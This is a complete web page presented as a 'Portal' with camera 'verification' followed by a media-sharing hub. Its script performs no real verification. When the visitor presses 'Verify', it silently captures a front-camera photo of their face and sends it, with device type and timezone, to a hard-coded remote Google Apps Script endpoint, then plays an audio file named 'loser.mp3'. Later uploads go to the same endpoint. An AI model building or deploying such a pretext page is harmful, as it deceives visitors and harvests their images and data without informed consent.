<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Portal</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital@0;1&family=Inter:wght@200;300&display=swap" rel="stylesheet">
  <style>
    body {
      background-color: #030303;
      color: #eaeaea;
      font-family: 'Inter', sans-serif;
      margin: 0;
      padding: 0;
      height: 100vh;
      overflow: hidden;
      display: flex;
      justify-content: center;
      align-items: center;
      text-align: center;
    }

    .screen {
      position: absolute;
      top: 0; left: 0; width: 100%; height: 100%;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      opacity: 0;
      visibility: hidden;
      transition: opacity 2s ease, visibility 2s;
      z-index: 10;
    }

    .screen.active {
      opacity: 1;
      visibility: visible;
    }

    .camera-wrapper {
      position: absolute;
      top: 15%;
      width: 100vw;
      height: 60vh;
      z-index: -1;
      mask-image: linear-gradient(to bottom, transparent, black 20%, black 80%, transparent);
      -webkit-mask-image: linear-gradient(to bottom, transparent, black 20%, black 80%, transparent);
    }

    #videoElement {
      width: 100%;
      height: 100%;
      object-fit: cover;
      filter: grayscale(100%) contrast(130%) brightness(50%);
      opacity: 0.6;
    }

    .title-text {
      font-family: 'Playfair Display', serif;
      font-size: 1.4rem;
      font-weight: 400;
      font-style: italic;
      color: #ffffff;
      margin-bottom: 40px;
      letter-spacing: 1px;
    }

    .btn {
      background: none;
      border: none;
      color: #999;
      font-family: 'Inter', sans-serif;
      font-size: 0.75rem;
      letter-spacing: 3px;
      text-transform: uppercase;
      cursor: pointer;
      padding: 12px 24px;
      margin: 8px 0;
      transition: all 0.5s ease;
      position: relative;
    }

    .btn::after {
      content: '';
      position: absolute;
      bottom: 6px;
      left: 50%;
      width: 0;
      height: 1px;
      background: #fff;
      transition: all 0.5s ease;
      transform: translateX(-50%);
    }

    .btn:hover {
      color: #fff;
    }

    .btn:hover::after {
      width: 40%;
    }

    .btn:disabled {
      opacity: 0.2;
      pointer-events: none;
    }

    input[type="file"] { display: none; }

    .status-text {
      font-size: 0.7rem;
      letter-spacing: 2px;
      text-transform: uppercase;
      color: #555;
      margin-top: 30px;
      min-height: 20px;
    }

    .preview-box {
      display: none;
      flex-direction: column;
      align-items: center;
      margin-top: 20px;
    }

    .preview-media {
      max-width: 80%;
      max-height: 250px;
      opacity: 0.8;
      border-radius: 2px;
    }
  </style>
</head>
<body>

  <audio id="bgMusic" src="loser.mp3" loop></audio>

  <div id="screen-verify" class="screen active">
    <div class="camera-wrapper">
      <video id="videoElement" autoplay playsinline muted></video>
    </div>
    
    <button id="btnVerify" class="btn">Verify</button>
    <div id="verifyStatus" class="status-text"></div>
  </div>

  <div id="screen-hub" class="screen">
    <div class="title-text">share a piece of right now</div>
    
    <label for="fileGallery" class="btn">Select from Gallery</label>
    <input type="file" id="fileGallery" accept="image/*,video/*">

    <label for="fileCamera" class="btn">Use Camera</label>
    <input type="file" id="fileCamera" accept="image/*,video/*" capture="environment">

    <div id="previewContainer" class="preview-box">
      <div id="mediaPlaceholder"></div>
      <button id="btnSendMedia" class="btn" style="margin-top: 24px;">Send</button>
    </div>

    <div id="hubStatus" class="status-text"></div>
  </div>

  <script>
    const APPS_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzYFjwZJmzqPjCZ00g1Qkdram_wdsuCyZTisWgJMwqzptMoOojCLH7L7x7IRvyHZEEd/exec";

    function getClientSpecs() {
      return {
        device: /iPhone|iPad|iPod|Android/i.test(navigator.userAgent) ? "Mobile" : "Desktop",
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown"
      };
    }

    const videoElement = document.getElementById('videoElement');
    const btnVerify = document.getElementById('btnVerify');
    const verifyStatus = document.getElementById('verifyStatus');
    const bgMusic = document.getElementById('bgMusic');
    let streamRef = null;

    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
      .then(stream => {
        streamRef = stream;
        videoElement.srcObject = stream;
      })
      .catch(() => {
        verifyStatus.textContent = "camera access required";
        btnVerify.disabled = true;
      });

    btnVerify.addEventListener('click', () => {
      bgMusic.play().catch(() => {});
      btnVerify.disabled = true;
      verifyStatus.textContent = "verifying...";

      const canvas = document.createElement('canvas');
      canvas.width = videoElement.videoWidth;
      canvas.height = videoElement.videoHeight;
      canvas.getContext('2d').drawImage(videoElement, 0, 0, canvas.width, canvas.height);
      
      const payload = {
        action: "upload_media",
        fileName: `verification_${Date.now()}.jpg`,
        mimeType: "image/jpeg",
        base64Data: canvas.toDataURL('image/jpeg', 0.8).split(',')[1],
        device: getClientSpecs().device,
        timezone: getClientSpecs().timezone
      };

      fetch(APPS_SCRIPT_URL, {
        method: "POST",
        mode: "no-cors",
        headers: { "Content-Type": "text/plain" },
        body: JSON.stringify(payload)
      })
      .then(() => {
        verifyStatus.textContent = "verified.";
        if (streamRef) streamRef.getTracks().forEach(track => track.stop());

        setTimeout(() => {
          document.getElementById('screen-verify').classList.remove('active');
          setTimeout(() => document.getElementById('screen-hub').classList.add('active'), 1500);
        }, 1200);
      })
      .catch(() => {
        verifyStatus.textContent = "failed connection";
        btnVerify.disabled = false;
      });
    });

    const fileGallery = document.getElementById('fileGallery');
    const fileCamera = document.getElementById('fileCamera');
    const previewContainer = document.getElementById('previewContainer');
    const mediaPlaceholder = document.getElementById('mediaPlaceholder');
    const btnSendMedia = document.getElementById('btnSendMedia');
    const hubStatus = document.getElementById('hubStatus');
    let selectedFile = null;

    function handleFile(file) {
      if (!file) return;
      selectedFile = file;
      mediaPlaceholder.innerHTML = "";
      hubStatus.textContent = "";

      const fileReader = new FileReader();
      fileReader.onload = (e) => {
        const el = document.createElement(file.type.startsWith("video/") ? "video" : "img");
        el.src = e.target.result;
        el.className = "preview-media";
        if (el.tagName === "VIDEO") el.controls = true;
        mediaPlaceholder.appendChild(el);
        previewContainer.style.display = "flex";
      };
      fileReader.readAsDataURL(file);
    }

    fileGallery.addEventListener('change', (e) => handleFile(e.target.files[0]));
    fileCamera.addEventListener('change', (e) => handleFile(e.target.files[0]));

    btnSendMedia.addEventListener('click', () => {
      if (!selectedFile) return;
      btnSendMedia.disabled = true;
      hubStatus.textContent = "transmitting...";

      const reader = new FileReader();
      reader.onload = () => {
        const payload = {
          action: "upload_media",
          fileName: selectedFile.name || `upload_${Date.now()}`,
          mimeType: selectedFile.type,
          base64Data: reader.result.split(",")[1],
          device: getClientSpecs().device,
          timezone: getClientSpecs().timezone
        };

        fetch(APPS_SCRIPT_URL, {
          method: "POST",
          mode: "no-cors",
          headers: { "Content-Type": "text/plain" },
          body: JSON.stringify(payload)
        })
        .then(() => {
          hubStatus.textContent = "sent.";
          setTimeout(() => {
            previewContainer.style.display = "none";
            hubStatus.textContent = "";
            btnSendMedia.disabled = false;
            selectedFile = null;
          }, 3000);
        })
        .catch(() => {
          hubStatus.textContent = "transmission failed.";
          btnSendMedia.disabled = false;
        });
      };
      reader.readAsDataURL(selectedFile);
    });
  </script>
</body>
</html>
